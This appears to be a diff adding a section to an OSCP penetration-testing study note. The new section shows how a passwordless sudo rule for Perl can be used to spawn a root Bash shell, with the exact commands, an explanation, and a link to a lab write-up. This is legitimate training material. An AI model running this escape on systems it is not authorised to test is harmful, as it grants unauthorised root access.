@@ -238,6 +238,23 @@ whoami
 
 **Reference:** [GTFOBins Knife](https://gtfobins.org/gtfobins/knife/)
 
+## Perl interpreter escape
+
+When sudo allows the exact Perl interpreter without a password, use inline evaluation and process replacement. Confirm the rule first and prove the identity after execution.
+
+~~~bash
+sudo -n -l
+sudo /usr/bin/perl -e 'exec "/bin/bash";'
+id
+whoami
+~~~
+
+> **Why:** The sudo rule grants the Perl process a privileged identity. Perl's exec replaces that process with Bash, so the shell inherits the identity already granted by sudo.
+
+## Shocker example
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] -- shelly used the exact NOPASSWD /usr/bin/perl rule to launch Bash as root
+
 ## Related stages
 
 - [[Linux - Service Scan]]
